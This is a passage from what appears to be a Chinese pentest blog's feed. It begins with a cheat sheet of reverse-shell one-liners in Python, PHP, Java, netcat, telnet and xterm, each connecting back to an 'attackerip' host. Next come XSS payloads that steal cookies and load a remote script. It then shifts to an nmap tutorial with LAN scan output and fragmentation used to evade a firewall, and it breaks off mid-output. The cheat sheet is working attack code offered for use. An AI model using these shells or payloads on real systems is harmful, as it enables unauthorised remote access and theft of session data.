href="#PYTHON-Reverse-Shell" class="headerlink" title="PYTHON Reverse Shell"></a>PYTHON Reverse Shell</h2><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</code></pre><h2 id="PHP-Reverse-Shell"><a href="#PHP-Reverse-Shell" class="headerlink" title="PHP Reverse Shell"></a>PHP Reverse Shell</h2><pre><code>php -r &apos;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</code></pre><h2 id="JAVA-Reverse-Shell"><a href="#JAVA-Reverse-Shell" class="headerlink" title="JAVA Reverse Shell"></a>JAVA Reverse Shell</h2><pre><code>r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()</code></pre><h2 id="NETCAT-Reverse-Shell"><a href="#NETCAT-Reverse-Shell" class="headerlink" title="NETCAT Reverse Shell"></a>NETCAT Reverse Shell</h2><pre><code>nc -e /bin/sh attackerip 4444nc -e /bin/sh 192.168.37.10 443# If the -e option is disabled, try this# mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe/bin/sh | nc attackerip 443rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4443 0/tmp/# If you have the wrong version of netcat installed, tryrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc attackerip &gt;/tmp/f</code></pre><h2 id="TELNET-Reverse-Shell"><a href="#TELNET-Reverse-Shell" class="headerlink" title="TELNET Reverse Shell"></a>TELNET Reverse Shell</h2><pre><code># If netcat is not available or /dev/tcpmknod backpipe p &amp;&amp; telnet attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</code></pre><h2 id="XTERM-Reverse-Shell"><a href="#XTERM-Reverse-Shell" class="headerlink" title="XTERM Reverse Shell"></a>XTERM Reverse Shell</h2><pre><code># Start an open X Server on your system (:1 – which listens on TCP port 6001)apt-get install xnestXnest :1# Then remember to authorise on your system the target IP to connect to youxterm -display 127.0.0.1:1# Run this INSIDE the spawned xterm on the open X Serverxhost +targetip# Then on the target connect back to the your X Serverxterm -display attackerip:1/usr/openwin/bin/xterm -display attackerip:1or$ DISPLAY=attackerip:0 xterm</code></pre><h2 id="XSS-Cheat-Codes"><a href="#XSS-Cheat-Codes" class="headerlink" title="XSS Cheat Codes"></a>XSS Cheat Codes</h2><pre><code>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet(&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;)&lt;script&gt;document.location=http://IP:PORT&lt;/script&gt;&apos;;alert(String.fromCharCode(88,83,83))//\&apos;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&apos;&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;&quot;;!–&quot;&lt;XSS&gt;=&amp;amp;amp;{()}&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;perl -e &apos;print &quot;&lt;IMG SRC=javascript:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;(&quot;&gt;&lt; iframes http://google.com &lt; iframes &gt;)&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;FRAMESET&gt;&lt;FRAME SRC=”javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;&quot;&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;%253cscript%253ealert(document.cookie)%253c/script%253e&quot;&gt;&lt;s&quot;%2b&quot;cript&gt;alert(document.cookie)&lt;/script&gt;%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)&apos;%3E&lt;img src=asdf onerror=alert(document.cookie)&gt;</code></pre><h2 id="SSH-Over-SCTP-With-Socat"><a href="#SSH-Over-SCTP-With-Socat" class="headerlink" title="SSH Over SCTP (With Socat)"></a>SSH Over SCTP (With Socat)</h2><pre><code># on remote server# assuming you want the SCTP socket to listen on port 80/SCTP and sshd is on 22/TCP$ socat SCTP-LISTEN:80,fork TCP:localhost:22# localhost# replace SERVER_IP with IP of listening server, and 80 with whatever port the SCTP listener is on :)$ socat TCP-LISTEN:1337,fork SCTP:SERVER_IP:80# create socks proxy# replace username and -p port value as needed...$ ssh -lusername localhost -D 8080 -p 1337</code></pre><h2 id="Install-Metasploit-Community-Edition-in-Kali-2-0"><a href="#Install-Metasploit-Community-Edition-in-Kali-2-0" class="headerlink" title="Install Metasploit Community Edition in Kali 2.0"></a>Install Metasploit Community Edition in Kali 2.0</h2><pre><code># github urlshttps://github.com/rapid7/metasploit-framework/wiki/Downloads-by-Versionwget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run &amp;&amp; chmod+x metasploit-latest-linux-x64-installer.run &amp;&amp; ./metasploit-latest-linux-x64-installer.run# create user$ /opt/metasploit/createuser[*] Please enter a username: root[*] Creating user &apos;root&apos; with password &apos;LsRRV[I^5&apos; ...# activate your metasploit licensehttps://localhost:3790# update metasploite$ /opt/metasploit/app/msfupdate# use msfconsole$ /opt/metasploit/app/msfconsole</code></pre><p><a href="https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads" target="_blank" rel="noopener">https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;渗透测试常用技巧和窍门第一部分，来自国外的EK， &lt;a href=&quot;https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/#msf-payloads&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;看原文的走这&lt;/a&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Pentest-Tips-and-Tricks-01-渗透测试的技巧和窍门&quot;&gt;&lt;a href=&quot;#Pentest-Tips-and-Tricks-01-渗透测试的技巧和窍门&quot; class=&quot;headerlink&quot; title=&quot;Pentest Tips and Tricks #01(渗透测试的技巧和窍门)&quot;&gt;&lt;/a&gt;Pentest Tips and Tricks #01(渗透测试的技巧和窍门)&lt;/h1&gt;&lt;h2 id=&quot;Nmap-Full-Web-Vulnerable-Scan&quot;&gt;&lt;a href=&quot;#Nmap-Full-Web-Vulnerable-Scan&quot; class=&quot;headerlink&quot; title=&quot;Nmap Full Web Vulnerable Scan&quot;&gt;&lt;/a&gt;&lt;strong&gt;Nmap Full Web Vulnerable Scan&lt;/strong&gt;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;cd /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;amp;&amp;amp; tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://airs-sec.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>nmap最佳扫描策略</title>
    <link href="http://airs-sec.com/2017/04/10/nmap%E6%9C%80%E4%BD%B3%E6%89%AB%E6%8F%8F%E7%AD%96%E7%95%A5/"/>
    <id>http://airs-sec.com/2017/04/10/nmap最佳扫描策略/</id>
    <published>2017-04-10T08:44:40.000Z</published>
    <updated>2017-04-11T06:16:44.684Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/1491826495144.jpg" alt="enter description here" title="1491826495144"></p><p>之前有一篇，<a href="http://airs-sec.com/2017/04/01/nmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">nmap基本使用总结</a>，都是一些基础的命令。</p><p>namp作为一款神器，如何使用好nmap很重要，特别是对于前期信息手机阶段。见过很多人，在信息收集阶段讨厌使用namp，而选择其他的扫描工具，但我觉得，工欲善其事，必先利其器，任何工具，只要熟悉和去摸索，都能很好的去使用。</p><p>通过nmap的最佳扫描策略，我们可以更搞笑的去使用nmap进行信息收集。</p><a id="more"></a><h1 id="适用于所有规模大小的网络的扫描策略"><a href="#适用于所有规模大小的网络的扫描策略" class="headerlink" title="适用于所有规模大小的网络的扫描策略"></a>适用于所有规模大小的网络的扫描策略</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">扫描整个C段</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sn -T4 -oG discovery.gnmap 192.168.123.1/24</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:12 CST</span><br><span class="line">Nmap scan report for 192.168.123.1</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Nmap scan report for 192.168.123.80</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Nmap scan report for 192.168.123.135</span><br><span class="line">Host is up (0.0098s latency).</span><br><span class="line">Nmap scan report for 192.168.123.215</span><br><span class="line">Host is up (0.093s latency).</span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 2.53 seconds</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 扫描结果</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat discovery.gnmap </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap 7.01 scan initiated Mon Apr 10 20:12:54 2017 as: nmap -sn -T4 -oG discovery.gnmap 192.168.123.1/24</span></span><br><span class="line">Host: 192.168.123.1 ()Status: Up</span><br><span class="line">Host: 192.168.123.80 ()Status: Up</span><br><span class="line">Host: 192.168.123.135 ()Status: Up</span><br><span class="line">Host: 192.168.123.215 ()Status: Up</span><br><span class="line"><span class="meta">#</span><span class="bash"> Nmap <span class="keyword">done</span> at Mon Apr 10 20:12:57 2017 -- 256 IP addresses (4 hosts up) scanned <span class="keyword">in</span> 2.53 seconds</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">对上述的扫描结果，过滤扫描中存活的主机</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> grep <span class="string">"Status: Up"</span> discovery.gnmap | cut -f 2 -d<span class="string">" "</span> &gt; livehost.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat livehost.txt </span></span><br><span class="line">192.168.123.1</span><br><span class="line">192.168.123.80</span><br><span class="line">192.168.123.135</span><br><span class="line">192.168.123.215</span><br></pre></td></tr></table></figure><blockquote><p>过滤出存活的主机之后，就可以开始扫描了。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> http://nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">加载文件中的存活主机进行扫描</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">oN：为输出成normal格式</span></span><br><span class="line"><span class="meta">#</span><span class="bash">oG：为输出成Grepable格式</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">探测tcp端口与服务</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo nmap -sS -Pn -T4 -oG TopTCP -iL livehost.txt </span></span><br><span class="line">[sudo] password for airs: </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:18 CST</span><br><span class="line">Nmap scan report for 192.168.123.1</span><br><span class="line">Host is up (0.0028s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">53/tcp open  domain</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 8C:AB:8E:D7:13:D1 (Shanghai Feixun Communication)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.135</span><br><span class="line">Host is up (0.0048s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.123.135 are closed</span><br><span class="line">MAC Address: 84:73:03:EA:35:81 (Letv Mobile and Intelligent Information Technology (Beijing))</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.215</span><br><span class="line">Host is up (0.0043s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">8081/tcp open  blackice-icecap</span><br><span class="line">9003/tcp open  unknown</span><br><span class="line">MAC Address: 0C:1D:AF:E3:13:3A (Xiaomi Communications)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.80</span><br><span class="line">Host is up (0.000014s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">81/tcp   open  hosts2-ns</span><br><span class="line">8000/tcp open  http-alt</span><br><span class="line"></span><br><span class="line">Nmap done: 4 IP addresses (4 hosts up) scanned in 54.86 seconds</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 探测udp端口与服务</span></span><br><span class="line"></span><br><span class="line">sudo nmap -sU -Pn -T4 -oN TopUDP -iL livehost.txt </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:20 CST</span><br><span class="line">Warning: 192.168.123.135 giving up on port because retransmission cap hit (6).</span><br><span class="line">Warning: 192.168.123.1 giving up on port because retransmission cap hit (6).</span><br><span class="line">Warning: 192.168.123.215 giving up on port because retransmission cap hit (6).</span><br><span class="line">Nmap scan report for 192.168.123.1</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 979 closed ports</span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open          domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">774/udp   open|filtered acmaint_dbd</span><br><span class="line">998/udp   open|filtered puparp</span><br><span class="line">1031/udp  open|filtered iad2</span><br><span class="line">1081/udp  open|filtered pvuniwien</span><br><span class="line">1719/udp  open|filtered h323gatestat</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">11487/udp open|filtered unknown</span><br><span class="line">16829/udp open|filtered unknown</span><br><span class="line">17282/udp open|filtered unknown</span><br><span class="line">17615/udp open|filtered unknown</span><br><span class="line">21383/udp open|filtered unknown</span><br><span class="line">25709/udp open|filtered unknown</span><br><span class="line">25931/udp open|filtered unknown</span><br><span class="line">34855/udp open|filtered unknown</span><br><span class="line">37843/udp open|filtered unknown</span><br><span class="line">44179/udp open|filtered unknown</span><br><span class="line">46093/udp open|filtered unknown</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">49220/udp open|filtered unknown</span><br><span class="line">MAC Address: 8C:AB:8E:D7:13:D1 (Shanghai Feixun Communication)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.135</span><br><span class="line">Host is up (0.064s latency).</span><br><span class="line">Not shown: 986 closed ports</span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">1008/udp  open|filtered ufsd</span><br><span class="line">1485/udp  open|filtered lansource</span><br><span class="line">4444/udp  open|filtered krb524</span><br><span class="line">17585/udp open|filtered unknown</span><br><span class="line">19663/udp open|filtered unknown</span><br><span class="line">23965/udp open|filtered unknown</span><br><span class="line">25003/udp open|filtered icl-twobase4</span><br><span class="line">32385/udp open|filtered unknown</span><br><span class="line">32777/udp open|filtered sometimes-rpc18</span><br><span class="line">42431/udp open|filtered unknown</span><br><span class="line">49169/udp open|filtered unknown</span><br><span class="line">49182/udp open|filtered unknown</span><br><span class="line">54094/udp open|filtered unknown</span><br><span class="line">61142/udp open|filtered unknown</span><br><span class="line">MAC Address: 84:73:03:EA:35:81 (Letv Mobile and Intelligent Information Technology (Beijing))</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.215</span><br><span class="line">Host is up (0.054s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.123.215 are closed (973) or open|filtered (27)</span><br><span class="line">MAC Address: 0C:1D:AF:E3:13:3A (Xiaomi Communications)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.80</span><br><span class="line">Host is up (0.0000070s latency).</span><br><span class="line">Not shown: 995 closed ports</span><br><span class="line">PORT     STATE         SERVICE</span><br><span class="line">68/udp   open|filtered dhcpc</span><br><span class="line">123/udp  open          ntp</span><br><span class="line">631/udp  open|filtered ipp</span><br><span class="line">1900/udp open|filtered upnp</span><br><span class="line">5353/udp open|filtered zeroconf</span><br><span class="line"></span><br><span class="line">Nmap done: 4 IP addresses (4 hosts up) scanned in 1080.60 seconds</span><br></pre></td></tr></table></figure><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#扫描所有的端口，UDP扫描可能变的非常慢</span><br><span class="line"></span><br><span class="line">$ nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</span><br><span class="line">$ nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</span><br><span class="line">$ nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#通过从文本过滤，发现tcp和udp端口</span><br><span class="line"></span><br><span class="line">$ grep “open” FullTCP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘&#123;print “T:”$0&#125;’</span><br><span class="line">$ grep “open” FullUDP|cut -f 1 -d ‘ ‘ | sort -nu | cut -f 1 -d ‘/’ |xargs | sed ‘s/ /,/g’|awk ‘&#123;print “U:”$0&#125;’</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">探测服务/操作系统版本</span><br><span class="line"></span><br><span class="line">$ nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br><span class="line">$ nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br><span class="line">$ nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">服务探测</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> nmap -sV -T4 -Pn -oG ServiceDetect -iL livehost.txt </span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:30 CST</span><br><span class="line">Nmap scan report for 192.168.123.1</span><br><span class="line">Host is up (0.015s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     Dropbear sshd 2016.74 (protocol 2.0)</span><br><span class="line">53/tcp open  domain  dnsmasq 2.76</span><br><span class="line">80/tcp open  http    Asus RT-AC54U WAP http config</span><br><span class="line">Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel, cpe:/h:asus:rt-ac54u</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.80</span><br><span class="line">Host is up (0.000044s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">81/tcp   open  http    Apache httpd 2.4.25</span><br><span class="line">8000/tcp open  http    WebFS httpd 1.21</span><br><span class="line">Service Info: Host: 127.0.1.1</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.135</span><br><span class="line">Host is up (0.013s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.123.135 are closed</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.123.215</span><br><span class="line">Host is up (0.012s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE          VERSION</span><br><span class="line">8081/tcp open  blackice-icecap?</span><br><span class="line">9003/tcp open  unknown</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 4 IP addresses (4 hosts up) scanned in 149.54 seconds</span><br></pre></td></tr></table></figure><h1 id="绕防火墙"><a href="#绕防火墙" class="headerlink" title="绕防火墙"></a>绕防火墙</h1><p>下面的图是在windows7上开启了防火墙，可以看到ping不通</p><p><img src="http://obgutsg63.bkt.clouddn.com/1491827716184.jpg" alt="enter description here" title="开启防火墙"></p><h2 id="分片"><a href="#分片" class="headerlink" title="分片"></a>分片</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">airs@airs-sec ~ $ sudo nmap -f 192.168.56.9</span><br><span class="line">[sudo] password for airs: </span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:36 CST</span><br><span class="line">Nmap scan report for 192.168.56.9</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">All 1000 scanned ports on 192.168.56.9 are filtered</span><br><span class="line">MAC Address: 08:00:27:19:2D:22 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.37 seconds</span><br><span class="line"></span><br><span class="line">airs@airs-sec ~ $ sudo nmap -f -sS -sV 192.168.56.9</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.01 ( https://nmap.org ) at 2017-04-10 20:37 CST</span><br><span class="line">Nmap scan report for 